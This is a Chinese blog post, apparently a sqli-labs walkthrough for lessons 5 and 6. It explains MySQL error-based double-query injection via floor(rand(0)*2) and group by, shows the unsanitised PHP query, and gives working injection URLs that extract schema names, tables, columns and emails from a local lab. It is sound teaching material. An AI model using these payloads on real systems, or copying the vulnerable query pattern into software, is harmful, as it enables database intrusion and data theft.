---
layout: post
title:  "0x02 双查询注入"
date:   2020-03-25 16：19
categories: [pentest]
tags: sqli-labs
---
sqli-labs less5-6
<!-- more -->

## DOUBLE INJECTION

> select语句中嵌套一个select语句，当数据库报错但是不返回查询结果时有可能会出现
>
> ```mysql
> select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
> ```
>
> 对这个payload尝试理解一下,第一层将concat(payload,foor(rand(0)*2)) 作为a，然后对a进行计数，
>
> ```mysql
> select count(*),concat(payload,floor(rand(0)*2)) as a from information_schema.columns group by a;
> ```
>
> mysql在处理count()和group by函数时，会建立虚拟表，将计数结果插入表中
>
> 在mysql中`floor(rand(0)*2)`结果存在规律
>
> ```mysql
> mysql> select floor(rand(0)*2) from information_schema.columns limit 6;
> +------------------+
> | floor(rand(0)*2) |
> +------------------+
> |                0 |
> |                1 |
> |                1 |
> |                0 |
> |                1 |
> |                1 |
> +------------------+
> ```
>
> 且在插入表时，插入时会对rand(0)进行重新计算，因此
>
> 第一次查询`rand(0)*2`为0，在插入表时group_key重新计算为1，
>
> 第二次查询`rand(0)*2`为1，直接在group_key计数+1
>
> 第三次查询`rand(0)*2`为0，在插入表时group_key重新计算为1，造成了插入group_key重复，造成报错
>
> 此时的报错信息为`concat(payload,floor(rand(0)*2))`重复
>
> 因此可以达到报错信息内直接显示我们的第二层查询也就是payload的查询结果

### less5

url

```mysql
http://127.0.0.1:9999/Less-5/?id=1%27
```

报错信息

```mysql
ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

但是页面内并不返回查询结果

```html
You are in...........
```

常规应该可以当作布尔型进行注入，不过题目是double injection

查看一下源码，查询语句是正常的，只是并不会直接返回查询成功的结果

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
```

尝试手注

```mysql
http://127.0.0.1:9999/Less-5/?id=-1%27 union select 1,count(*),concat(0x3a,0x3a,(select schema_name from information_schema.schemata limit 4,1 ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23

http://127.0.0.1:9999/Less-5/?id=-1%27 union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema = 'security' limit 0,1 ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23

http://127.0.0.1:9999/Less-5/?id=-1%27 union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name = 'emails' limit 0,1 ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23

http://127.0.0.1:9999/Less-5/?id=-1%27 union select 1,count(*),concat(0x3a,0x3a,(select email_id from emails where id =1 limit 0,1 ),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23
```

### less 6

url

```mysql
http://127.0.0.1:9999/Less-6/?id=1"
```

报错信息

```mysql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1
```

这里就是双引号了

手注

```html
http://127.0.0.1:9999/Less-6/?id=1" union select 1,count(*),concat(0x3a,0x3a,(select schema_name from information_schema.schemata limit 4,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

http://127.0.0.1:9999/Less-6/?id=1" union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema = 'security' limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

http://127.0.0.1:9999/Less-6/?id=1" union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name = 'emails' limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

http://127.0.0.1:9999/Less-6/?id=1" union select 1,count(*),concat((select email_id from emails  where id =1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23
```

